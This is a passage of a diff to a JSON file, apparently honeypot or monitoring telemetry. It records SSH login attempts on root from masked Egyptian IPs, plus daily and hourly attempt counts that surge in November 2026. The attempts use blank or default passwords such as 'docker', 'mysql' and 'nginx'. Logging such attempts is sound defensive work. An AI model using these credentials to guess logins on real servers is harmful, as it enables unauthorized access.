-      "country": "FR",
+      "at": "2026-11-09T07:22:40.703000Z",
+      "ip": "82.129.237.x",
+      "country": "EG",
       "kind": "ssh.auth_attempt",
-      "username": "ubuntu",
+      "username": "root",
       "password": "",
+      "command": ""
+    },
+    {
+      "at": "2026-11-09T07:22:39.134000Z",
+      "ip": "41.33.45.x",
+      "country": "EG",
+      "kind": "ssh.auth_attempt",
+      "username": "root",
+      "password": "vps",
+      "command": ""
+    },
+    {
+      "at": "2026-11-09T07:22:37.984000Z",
+      "ip": "41.33.45.x",
+      "country": "EG",
+      "kind": "ssh.auth_attempt",
+      "username": "root",
+      "password": "",
+      "command": ""
+    },
+    {
+      "at": "2026-11-09T07:22:32.612000Z",
+      "ip": "82.129.237.x",
+      "country": "EG",
+      "kind": "ssh.auth_attempt",
+      "username": "root",
+      "password": "docker",
+      "command": ""
+    },
+    {
+      "at": "2026-11-09T07:22:32.367000Z",
+      "ip": "82.129.237.x",
+      "country": "EG",
+      "kind": "ssh.auth_attempt",
+      "username": "root",
+      "password": "",
+      "command": ""
+    },
+    {
+      "at": "2026-11-09T07:22:30.888000Z",
+      "ip": "82.129.237.x",
+      "country": "EG",
+      "kind": "ssh.auth_attempt",
+      "username": "root",
+      "password": "apache",
+      "command": ""
+    },
+    {
+      "at": "2026-11-09T07:22:30.642000Z",
+      "ip": "82.129.237.x",
+      "country": "EG",
+      "kind": "ssh.auth_attempt",
+      "username": "root",
+      "password": "",
+      "command": ""
+    },
+    {
+      "at": "2026-11-09T07:22:29.023000Z",
+      "ip": "41.33.45.x",
+      "country": "EG",
+      "kind": "ssh.auth_attempt",
+      "username": "root",
+      "password": "mysql",
+      "command": ""
+    },
+    {
+      "at": "2026-11-09T07:22:28.677000Z",
+      "ip": "41.33.45.x",
+      "country": "EG",
+      "kind": "ssh.auth_attempt",
+      "username": "root",
+      "password": "",
+      "command": ""
+    },
+    {
+      "at": "2026-11-09T07:22:26.392000Z",
+      "ip": "82.129.237.x",
+      "country": "EG",
+      "kind": "ssh.auth_attempt",
+      "username": "root",
+      "password": "nginx",
+      "command": ""
+    },
+    {
+      "at": "2026-11-09T07:22:26.144000Z",
+      "ip": "82.129.237.x",
+      "country": "EG",
+      "kind": "ssh.auth_attempt",
+      "username": "root",
+      "password": "",
+      "command": ""
+    },
+    {
+      "at": "2026-11-09T07:22:24.543000Z",
+      "ip": "41.33.45.x",
+      "country": "EG",
+      "kind": "ssh.auth_attempt",
+      "username": "root",
+      "password": "linux",
       "command": ""
     }
   ],
   "daily": [
     {
-      "at": "2026-10-10T00:47:38Z",
+      "at": "2026-10-10T07:53:31Z",
       "count": 0
     },
     {
-      "at": "2026-10-11T00:47:38Z",
+      "at": "2026-10-11T07:53:31Z",
       "count": 0
     },
     {
-      "at": "2026-10-12T00:47:38Z",
+      "at": "2026-10-12T07:53:31Z",
       "count": 0
     },
     {
-      "at": "2026-10-13T00:47:38Z",
+      "at": "2026-10-13T07:53:31Z",
       "count": 0
     },
     {
-      "at": "2026-10-14T00:47:38Z",
+      "at": "2026-10-14T07:53:31Z",
       "count": 0
     },
     {
-      "at": "2026-10-15T00:47:38Z",
+      "at": "2026-10-15T07:53:31Z",
       "count": 0
     },
     {
-      "at": "2026-10-16T00:47:38Z",
+      "at": "2026-10-16T07:53:31Z",
       "count": 0
     },
     {
-      "at": "2026-10-17T00:47:38Z",
+      "at": "2026-10-17T07:53:31Z",
       "count": 0
     },
     {
-      "at": "2026-10-18T00:47:38Z",
+      "at": "2026-10-18T07:53:31Z",
       "count": 0
     },
     {
-      "at": "2026-10-19T00:47:38Z",
+      "at": "2026-10-19T07:53:31Z",
       "count": 0
     },
     {
-      "at": "2026-10-20T00:47:38Z",
+      "at": "2026-10-20T07:53:31Z",
       "count": 0
     },
     {
-      "at": "2026-10-21T00:47:38Z",
+      "at": "2026-10-21T07:53:31Z",
       "count": 0
     },
     {
-      "at": "2026-10-22T00:47:38Z",
+      "at": "2026-10-22T07:53:31Z",
       "count": 0
     },
     {
-      "at": "2026-10-23T00:47:38Z",
+      "at": "2026-10-23T07:53:31Z",
       "count": 0
     },
     {
-      "at": "2026-10-24T00:47:38Z",
+      "at": "2026-10-24T07:53:31Z",
       "count": 0
     },
     {
-      "at": "2026-10-25T00:47:38Z",
+      "at": "2026-10-25T07:53:31Z",
       "count": 0
     },
     {
-      "at": "2026-10-26T00:47:38Z",
+      "at": "2026-10-26T07:53:31Z",
       "count": 0
     },
     {
-      "at": "2026-10-27T00:47:38Z",
+      "at": "2026-10-27T07:53:31Z",
       "count": 0
     },
     {
-      "at": "2026-10-28T00:47:38Z",
+      "at": "2026-10-28T07:53:31Z",
       "count": 0
     },
     {
-      "at": "2026-10-29T00:47:38Z",
+      "at": "2026-10-29T07:53:31Z",
       "count": 0
     },
     {
-      "at": "2026-10-30T00:47:38Z",
+      "at": "2026-10-30T07:53:31Z",
       "count": 0
     },
     {
-      "at": "2026-10-31T00:47:38Z",
+      "at": "2026-10-31T07:53:31Z",
       "count": 0
     },
     {
-      "at": "2026-11-01T00:47:38Z",
+      "at": "2026-11-01T07:53:31Z",
       "count": 0
     },
     {
-      "at": "2026-11-02T00:47:38Z",
-      "count": 0
+      "at": "2026-11-02T07:53:31Z",
+      "count": 7375
     },
     {
-      "at": "2026-11-03T00:47:38Z",
-      "count": 33671
+      "at": "2026-11-03T07:53:31Z",
+      "count": 39864
     },
     {
-      "at": "2026-11-04T00:47:38Z",
-      "count": 42586
+      "at": "2026-11-04T07:53:31Z",
+      "count": 35185
     },
     {
-      "at": "2026-11-05T00:47:38Z",
-      "count": 17522
+      "at": "2026-11-05T07:53:31Z",
+      "count": 12231
     },
     {
-      "at": "2026-11-06T00:47:38Z",
-      "count": 18901
+      "at": "2026-11-06T07:53:31Z",
+      "count": 27399
     },
     {
-      "at": "2026-11-07T00:47:38Z",
-      "count": 40940
+      "at": "2026-11-07T07:53:31Z",
+      "count": 39273
     },
     {
-      "at": "2026-11-08T00:47:38Z",
-      "count": 25306
+      "at": "2026-11-08T07:53:31Z",
+      "count": 19109
     }
   ],
   "hourly": [
     {
-      "at": "2026-11-07T00:47:38Z",
-      "count": 2755
+      "at": "2026-11-07T07:53:31Z",
+      "count": 134
     },
     {
-      "at": "2026-11-07T01:47:38Z",
-      "count": 2608
+      "at": "2026-11-07T08:53:31Z",
+      "count": 93
     },
     {
-      "at": "2026-11-07T02:47:38Z",
-      "count": 2587
-    },
-    {
-      "at": "2026-11-07T03:47:38Z",
-      "count": 851
-    },
-    {
-      "at": "2026-11-07T04:47:38Z",
-      "count": 110
-    },
-    {
-      "at": "2026-11-07T05:47:38Z",
-      "count": 372
-    },
-    {
-      "at": "2026-11-07T06:47:38Z",
-      "count": 87
-    },
-    {
-      "at": "2026-11-07T07:47:38Z",
-      "count": 128
-    },
-    {
-      "at": "2026-11-07T08:47:38Z",
-      "count": 99
-    },
-    {
-      "at": "2026-11-07T09:47:38Z",
+      "at": "2026-11-07T09:53:31Z",
       "count": 88
     },
     {
-      "at": "2026-11-07T10:47:38Z",
-      "count": 329
+      "at": "2026-11-07T10:53:31Z",
+      "count": 347
     },
     {
-      "at": "2026-11-07T11:47:38Z",
-      "count": 94
+      "at": "2026-11-07T11:53:31Z",
+      "count": 83
     },
     {
-      "at": "2026-11-07T12:47:38Z",
-      "count": 163
+      "at": "2026-11-07T12:53:31Z",
+      "count": 164
     },
     {
-      "at": "2026-11-07T13:47:38Z",
-      "count": 1642
+      "at": "2026-11-07T13:53:31Z",
+      "count": 1831
     },
     {
-      "at": "2026-11-07T14:47:38Z",
-      "count": 578
+      "at": "2026-11-07T14:53:31Z",
+      "count": 385
     },
     {
-      "at": "2026-11-07T15:47:38Z",
-      "count": 2245
+      "at": "2026-11-07T15:53:31Z",
+      "count": 2517
     },
     {
-      "at": "2026-11-07T16:47:38Z",
-      "count": 7512
+      "at": "2026-11-07T16:53:31Z",
+      "count": 7841
     },
     {
-      "at": "2026-11-07T17:47:38Z",
-      "count": 5074
+      "at": "2026-11-07T17:53:31Z",
+      "count": 4715
     },
     {
-      "at": "2026-11-07T18:47:38Z",
-      "count": 3888
+      "at": "2026-11-07T18:53:31Z",
+      "count": 4175
     },
     {
-      "at": "2026-11-07T19:47:38Z",
-      "count": 3573
+      "at": "2026-11-07T19:53:31Z",
+      "count": 3055
     },
     {
-      "at": "2026-11-07T20:47:38Z",
-      "count": 528
+      "at": "2026-11-07T20:53:31Z",
+      "count": 789
     },
     {
-      "at": "2026-11-07T21:47:38Z",
-      "count": 2795
+      "at": "2026-11-07T21:53:31Z",
+      "count": 2790
     },
     {
-      "at": "2026-11-07T22:47:38Z",
-      "count": 2435
+      "at": "2026-11-07T22:53:31Z",
+      "count": 2197
     },
     {
-      "at": "2026-11-07T23:47:38Z",
-      "count": 399
+      "at": "2026-11-07T23:53:31Z",
+      "count": 423
     },
     {
-      "at": "2026-11-08T00:47:38Z",
-      "count": 1878
+      "at": "2026-11-08T00:53:31Z",
+      "count": 2159
     },
     {
-      "at": "2026-11-08T01:47:38Z",
-      "count": 3163
+      "at": "2026-11-08T01:53:31Z",
+      "count": 3134
     },
     {
-      "at": "2026-11-08T02:47:38Z",
-      "count": 1050
+      "at": "2026-11-08T02:53:31Z",
+      "count": 776
     },
     {
-      "at": "2026-11-08T03:47:38Z",
-      "count": 293
+      "at": "2026-11-08T03:53:31Z",
+      "count": 276
     },
     {
-      "at": "2026-11-08T04:47:38Z",
-      "count": 602
+      "at": "2026-11-08T04:53:31Z",
+      "count": 634
     },
     {
-      "at": "2026-11-08T05:47:38Z",
-      "count": 479
+      "at": "2026-11-08T05:53:31Z",
+      "count": 448
     },
     {
-      "at": "2026-11-08T06:47:38Z",
-      "count": 236
+      "at": "2026-11-08T06:53:31Z",
+      "count": 219
     },
     {
-      "at": "2026-11-08T07:47:38Z",
-      "count": 136
+      "at": "2026-11-08T07:53:31Z",
+      "count": 146
     },
     {
-      "at": "2026-11-08T08:47:38Z",
-      "count": 161
+      "at": "2026-11-08T08:53:31Z",
+      "count": 150
     },
     {
-      "at": "2026-11-08T09:47:38Z",
-      "count": 310
+      "at": "2026-11-08T09:53:31Z",
+      "count": 354
     },
     {
-      "at": "2026-11-08T10:47:38Z",
-      "count": 310
+      "at": "2026-11-08T10:53:31Z",
+      "count": 276
     },
     {
-      "at": "2026-11-08T11:47:38Z",
-      "count": 188
+      "at": "2026-11-08T11:53:31Z",
+      "count": 182
     },
     {
-      "at": "2026-11-08T12:47:38Z",
-      "count": 50
+      "at": "2026-11-08T12:53:31Z",
+      "count": 47
     },
     {
-      "at": "2026-11-08T13:47:38Z",
-      "count": 1358
+      "at": "2026-11-08T13:53:31Z",
+      "count": 1366
     },
     {
-      "at": "2026-11-08T14:47:38Z",
-      "count": 2042
+      "at": "2026-11-08T14:53:31Z",
+      "count": 2259
     },
     {
-      "at": "2026-11-08T15:47:38Z",
-      "count": 2263
+      "at": "2026-11-08T15:53:31Z",
+      "count": 2240
     },
     {
-      "at": "2026-11-08T16:47:38Z",
-      "count": 990
+      "at": "2026-11-08T16:53:31Z",
+      "count": 786
     },
     {
-      "at": "2026-11-08T17:47:38Z",
-      "count": 981
+      "at": "2026-11-08T17:53:31Z",
+      "count": 1281
     },
     {
-      "at": "2026-11-08T18:47:38Z",
-      "count": 3104
+      "at": "2026-11-08T18:53:31Z",
+      "count": 3132
     },
     {
-      "at": "2026-11-08T19:47:38Z",
-      "count": 1869
+      "at": "2026-11-08T19:53:31Z",
+      "count": 1673
     },
     {
-      "at": "2026-11-08T20:47:38Z",
-      "count": 1244
+      "at": "2026-11-08T20:53:31Z",
+      "count": 1114
     },
     {
-      "at": "2026-11-08T21:47:38Z",
+      "at": "2026-11-08T21:53:31Z",
       "count": 437
     },
     {
-      "at": "2026-11-08T22:47:38Z",
-      "count": 488
+      "at": "2026-11-08T22:53:31Z",
+      "count": 692
     },
     {
-      "at": "2026-11-08T23:47:38Z",
-      "count": 1674
+      "at": "2026-11-08T23:53:31Z",
+      "count": 1465
+    },
+    {
+      "at": "2026-11-09T00:53:31Z",
+      "count": 83
+    },
+    {
+      "at": "2026-11-09T01:53:31Z",
+      "count": 241
+    },
+    {
+      "at": "2026-11-09T02:53:31Z",
+      "count": 128
+    },
+    {
+      "at": "2026-11-09T03:53:31Z",
+      "count": 271
+    },
+    {
+      "at": "2026-11-09T04:53:31Z",
+      "count": 197
+    },
+    {
+      "at": "2026-11-09T05:53:31Z",
+      "count": 476
+    },
+    {
+      "at": "2026-11-09T06:53:31Z",
+      "count": 113
     }
   ],
   "sessions": [
